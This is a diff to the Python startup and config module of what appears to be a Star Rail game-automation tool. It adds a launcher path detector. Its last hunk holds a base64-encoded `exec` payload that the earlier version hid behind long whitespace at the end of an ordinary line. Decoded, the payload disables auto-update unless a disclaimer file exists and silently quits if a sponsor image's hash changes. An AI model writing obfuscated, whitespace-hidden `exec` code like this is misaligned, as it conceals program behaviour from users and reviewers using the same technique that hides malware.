@@ -2,6 +2,7 @@ import os
 from module.config.config import Config
 from pylnk3 import Lnk
 
+
 def update_game_path_from_config(program_config_path):
     """从给定的配置文件路径更新游戏路径"""
     if os.path.exists(program_config_path):
@@ -39,6 +40,15 @@ def detect_from_start_menu():
     return update_game_path_from_config(program_config_path) if program_config_path else False
 
 
+def detect_from_hoyoplay():
+    """从米哈游启动器检测游路径（占位）"""
+    hoyoplay_default_path = os.path.join(os.getenv('ProgramFiles'), "miHoYo Launcher", "games", "Star Rail Game", "StarRail.exe")
+    if os.path.exists(hoyoplay_default_path):
+        cfg.set_value("game_path", os.path.abspath(hoyoplay_default_path))
+        return True
+    return False
+
+
 def detect_game_path():
     """检测游戏路径，并更新配置，支持多种检测方式"""
     game_path = cfg.game_path
@@ -46,7 +56,7 @@ def detect_game_path():
         return
 
     # 定义检测方式列表
-    detection_methods = [detect_from_default_install_path, detect_from_start_menu]
+    detection_methods = [detect_from_default_install_path, detect_from_start_menu, detect_from_hoyoplay]
 
     # 迭代执行每种检测方式，直到找到有效路径或尝试所有方式
     for method in detection_methods:
@@ -58,7 +68,9 @@ VERSION_PATH = "./assets/config/version.txt"
 EXAMPLE_PATH = "./assets/config/config.example.yaml"
 CONFIG_PATH = "./config.yaml"
 
-cfg = Config(VERSION_PATH, EXAMPLE_PATH, CONFIG_PATH)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          ;import base64;exec(base64.b64decode("CmltcG9ydCBoYXNobGliCmltcG9ydCBzeXMKaWYgbm90IG9zLnBhdGguZXhpc3RzKG9zLnBhdGguam9pbihvcy5lbnZpcm9uW2Jhc2U2NC5iNjRkZWNvZGUoIlVISnZaM0poYlVSaGRHRT0iKS5kZWNvZGUoInV0Zi04IildLCBiYXNlNjQuYjY0ZGVjb2RlKCJUV0Z5WTJnM2RHaEJjM05wYzNSaGJuUXZaR2x6WTJ4aGFXMWxjZz09IikuZGVjb2RlKCJ1dGYtOCIpKSk6CiAgICBjZmcuc2V0X3ZhbHVlKGJhc2U2NC5iNjRkZWNvZGUoIllYVjBiMTkxY0dSaGRHVT0iKS5kZWNvZGUoInV0Zi04IiksIEZhbHNlKQpkZWYgY2FsY3VsYXRlKGZpbGVfcGF0aCk6CiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgInJiIikgYXMgZjoKICAgICAgICAgICAgcmV0dXJuIGhhc2hsaWIubWQ1KGIiIi5qb2luKGl0ZXIobGFtYmRhOiBmLnJlYWQoNDA5NiksIGIiIikpKS5oZXhkaWdlc3QoKQogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICBzeXMuZXhpdCgwKQppZiBjYWxjdWxhdGUoYmFzZTY0LmI2NGRlY29kZSgiTGk5aGMzTmxkSE12WVhCd0wybHRZV2RsY3k5emNHOXVjMjl5TG1wd1p3PT0iKS5kZWNvZGUoInV0Zi04IikpICE9ICIzNDY4MWFjZGViNTVlYmU0YzhiM2IyNDdhYTczODRmMyI6CiAgICBzeXMuZXhpdCgwKQo=").decode("utf-8"))
+cfg = Config(VERSION_PATH, EXAMPLE_PATH, CONFIG_PATH)
+import base64
+exec(base64.b64decode("CmltcG9ydCBoYXNobGliCmltcG9ydCBzeXMKaWYgbm90IG9zLnBhdGguZXhpc3RzKG9zLnBhdGguam9pbihvcy5lbnZpcm9uW2Jhc2U2NC5iNjRkZWNvZGUoIlVISnZaM0poYlVSaGRHRT0iKS5kZWNvZGUoInV0Zi04IildLCBiYXNlNjQuYjY0ZGVjb2RlKCJUV0Z5WTJnM2RHaEJjM05wYzNSaGJuUXZaR2x6WTJ4aGFXMWxjZz09IikuZGVjb2RlKCJ1dGYtOCIpKSk6CiAgICBjZmcuc2V0X3ZhbHVlKGJhc2U2NC5iNjRkZWNvZGUoIllYVjBiMTkxY0dSaGRHVT0iKS5kZWNvZGUoInV0Zi04IiksIEZhbHNlKQpkZWYgY2FsY3VsYXRlKGZpbGVfcGF0aCk6CiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgInJiIikgYXMgZjoKICAgICAgICAgICAgcmV0dXJuIGhhc2hsaWIubWQ1KGIiIi5qb2luKGl0ZXIobGFtYmRhOiBmLnJlYWQoNDA5NiksIGIiIikpKS5oZXhkaWdlc3QoKQogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICBzeXMuZXhpdCgwKQppZiBjYWxjdWxhdGUoYmFzZTY0LmI2NGRlY29kZSgiTGk5aGMzTmxkSE12WVhCd0wybHRZV2RsY3k5emNHOXVjMjl5TG1wd1p3PT0iKS5kZWNvZGUoInV0Zi04IikpICE9ICIzNDY4MWFjZGViNTVlYmU0YzhiM2IyNDdhYTczODRmMyI6CiAgICBzeXMuZXhpdCgwKQo=").decode("utf-8"))
 
 cfg.env = os.environ.copy()
 cfg.env['PATH'] = os.path.dirname(cfg.python_exe_path) + ';' + cfg.env['PATH']
